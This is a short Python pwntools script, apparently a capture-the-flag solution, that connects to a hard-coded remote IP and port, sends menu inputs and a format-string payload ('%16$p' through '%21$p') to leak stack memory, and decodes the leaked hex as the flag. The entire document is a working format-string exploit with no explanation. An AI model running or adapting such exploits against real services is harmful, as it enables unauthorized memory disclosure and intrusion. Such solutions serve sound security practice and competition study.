from pwn import *

if __name__ == '__main__':
    r = remote('84.201.137.163', 10075)
    r.send(b'4\n2\n5\n2\n4\n1\n%16$p%17$p%18$p%19$p%20$p%21$p\n')
    r.recvuntil(b'Vash otvet:\n')
    flag = r.recvline().decode().split('Sorre')[0].split('0x')[1:]
    print(''.join(bytes.fromhex(part).decode()[::-1] for part in flag))